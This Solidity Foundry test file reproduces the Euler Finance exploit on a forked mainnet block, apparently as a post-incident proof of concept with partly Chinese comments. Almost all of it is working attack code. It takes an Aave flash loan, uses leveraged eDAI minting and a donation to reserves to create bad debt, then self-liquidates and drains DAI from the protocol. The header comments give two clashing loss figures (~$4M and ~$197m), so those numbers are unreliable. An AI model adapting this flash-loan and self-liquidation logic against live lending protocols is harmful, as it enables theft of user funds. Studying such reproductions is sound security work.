// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import '@openzeppelin/contracts/token/ERC20/IERC20.sol';

// @KeyInfo - Total Lost : 3000 ETH or $ ~4M
// Attack Tx（其中之一）: https://etherscan.io/tx/0xc310a0affe2169d1f6feec1c63dbc7f7c62a887fa48795d327d4d2da2d6b111d
// Attacker Address(EOA): 0x5f259d0b76665c337c6104145894f4d1d2758b8c
// Attack Contract Address: 0xebc29199c817dc47ba12e3f86102564d640cbf99
// Vulnerable Address(logic): 0xbb0d4bb654a21054af95456a3b29c63e8d1f4c0a
// Total Loss: ~$197m

// @Analysis
// PeckShield: https://twitter.com/peckshield/status/1635229594596036608

event log_named_decimal_uint(string name, uint256 balance, uint256 decimal);

//   分析攻击需要的变量（AaveLendingPool, EulerPool都是代理合约）
IAaveLendingPool constant AaveLendingPool = IAaveLendingPool(0x7d2768dE32b0b80b7a3454c06BdAc94A69DDc7A9);
address constant EulerProtocol = 0x27182842E098f60e3D576794A5bFFb0777E025d3;

IERC20 constant DAI = IERC20(0x6B175474E89094C44Da98b954EedeAC495271d0F);
IeDAI constant eDAI = IeDAI(0xe025E3ca2bE02316033184551D4d3Aa22024D9DC);
IdDAI constant dDAI = IdDAI(0x6085Bc95F506c326DCBCD7A6dd6c79FBc18d4686);
IEuler constant Euler = IEuler(0xf43ce1d09050BAfd6980dD43Cde2aB9F18C85b34);

contract EulerFinancePoC is Test { // 模拟攻击
    Borrow internal borrowContract;
    liquidator internal liquidatorContract;

    function setUp() public {
        vm.createSelectFork("mainnet", 16_817_995);

        vm.label(address(DAI), "aDAI");
        vm.label(address(eDAI), "eDAI");
        vm.label(address(dDAI), "dDAI");
        vm.label(address(AaveLendingPool), "AaveV2");
        vm.label(address(Euler), "Euler");
    }
       
    function testExploit_Euler() public {
        console.log("--------------------------------- Pre-work ---------------------------------");
        console.log("Tx: 0xc310a0affe2169d1f6feec1c63dbc7f7c62a887fa48795d327d4d2da2d6b111d");

        uint256 eulerToken = DAI.balanceOf(EulerProtocol);
        emit log_named_decimal_uint ("DAI.balanceOf(EulerProtocol)", eulerToken, 18);

        address[] memory assets = new address[](1);
        assets[0] = address(DAI);

        uint256[] memory amounts = new uint256[](1);
        amounts[0] = 30_000_000 * 10**18;

        uint256[] memory modes = new uint256[](1);
        modes[0] = 0;

        console.log("-------------------------------- Start Exploit ----------------------------------");
        bytes memory params = hex"0000000000000000000000000000000000000000000000000000000001c9c380000000000000000000000000000000000000000000000000000000000bebc2000000000000000000000000000000000000000000000000000000000005f5e10000000000000000000000000000000000000000000000000000000000029f63000000000000000000000000006b175474e89094c44da98b954eedeac495271d0f000000000000000000000000e025e3ca2be02316033184551d4d3aa22024d9dc0000000000000000000000006085bc95f506c326dcbcd7a6dd6c79fbc18d4686";
        AaveLendingPool.flashLoan(address(this), assets, amounts, modes, address(this), params, 0);

        console.log("-------------------------------- After Exploit ----------------------------------");
        uint256 eulerTokenAfter = DAI.balanceOf(EulerProtocol);
        emit log_named_decimal_uint ("DAI.balanceOf(EulerProtocol)", eulerTokenAfter, 18);
        emit log_named_decimal_uint ("EulerProtocol loss", eulerToken - eulerTokenAfter, 18);
    }

    function executeOperation(
        address[] calldata assets, 
        uint256[] calldata amounts, 
        uint256[] calldata premiums, 
        address initiator, 
        bytes calldata params
    ) external returns (bool) {
        DAI.approve(address(AaveLendingPool), type(uint256).max);
        borrowContract = new Borrow();
        liquidatorContract = new liquidator();
        DAI.transfer(address(borrowContract), DAI.balanceOf(address(this)));
        // 制造烂账
        borrowContract.attack_step1(address(borrowContract), address(liquidatorContract));
        // 自我清算
        liquidatorContract.attack_step2(address(borrowContract), address(liquidatorContract));
        return true;
    }
}

/* ----------------- other contract------------------- */
contract Borrow {
    function attack_step1(address BorrowAddress, address liquidatorAddress) external {
        uint256 daiBalance = DAI.balanceOf(address(this));
        DAI.approve(address(EulerProtocol), type(uint256).max);

        eDAI.deposit(0, daiBalance * 2/3);
        eDAI.mint(0, daiBalance *10 * 2/3);

        console.log("First borrow:");
        emit log_named_decimal_uint ("eDAI balance:", IERC20(address(eDAI)).balanceOf(BorrowAddress), 18);
        emit log_named_decimal_uint ("dDAI balance:", IERC20(address(dDAI)).balanceOf(BorrowAddress), 18);

        dDAI.repay(0, daiBalance /3);
        eDAI.mint(0, daiBalance *10 * 2/3);

        console.log("Second borrow:");
        emit log_named_decimal_uint ("eDAI balance:", IERC20(address(eDAI)).balanceOf(BorrowAddress), 18);
        emit log_named_decimal_uint ("dDAI balance:", IERC20(address(dDAI)).balanceOf(BorrowAddress), 18);
        
        eDAI.donateToReserves(0, daiBalance * 10 /3);
        console.log("After donate:");
        emit log_named_decimal_uint ("eDAI balance:", IERC20(address(eDAI)).balanceOf(BorrowAddress), 18);
        emit log_named_decimal_uint ("dDAI balance:", IERC20(address(dDAI)).balanceOf(BorrowAddress), 18);
    }
}

contract liquidator {
    function attack_step2(address BorrowAddress, address liquidatorAddress) external {
        IEuler.LiquidationOpportunity memory returnData =
            Euler.checkLiquidation(liquidatorAddress, BorrowAddress, address(DAI), address(DAI));
        // 清算
        Euler.liquidate(BorrowAddress, address(DAI), address(DAI), returnData.repay, returnData.yield);
        eDAI.withdraw(0, DAI.balanceOf(EulerProtocol));
        DAI.transfer(msg.sender, DAI.balanceOf(address(this)));
    }
    
}

// 根据palcon来写接口，internal的函数并不会显示
/* -------------------- Interface -------------------- */
interface IAaveLendingPool {
    function flashLoan(
    address receiverAddress,
    address[] calldata assets,
    uint256[] calldata amounts,
    uint256[] calldata modes,
    address onBehalfOf,
    bytes calldata params,
    uint16 referralCode
  ) external;
}

interface IeDAI {
    function deposit(uint256 subAccountId, uint256 amount) external;
    function mint(uint256 subAccountId, uint256 amount) external;
    function donateToReserves(uint256 subAccountId, uint256 amount) external;
    function withdraw(uint256 subAccountId, uint256 amount) external;
}

interface IdDAI {
    function repay(uint256 subAccountId, uint256 amount) external;
}

interface IEuler {
    struct LiquidationOpportunity {
        uint256 repay;
        uint256 yield;
        uint256 healthScore;
        uint256 baseDiscount;
        uint256 discount;
        uint256 conversionRate;
    }

    function liquidate(
        address violator,
        address underlying,
        address collateral,
        uint256 repay,
        uint256 minYield
    ) external;
    function checkLiquidation(
        address liquidator,
        address violator,
        address underlying,
        address collateral
    ) external returns (LiquidationOpportunity memory liqOpp);
}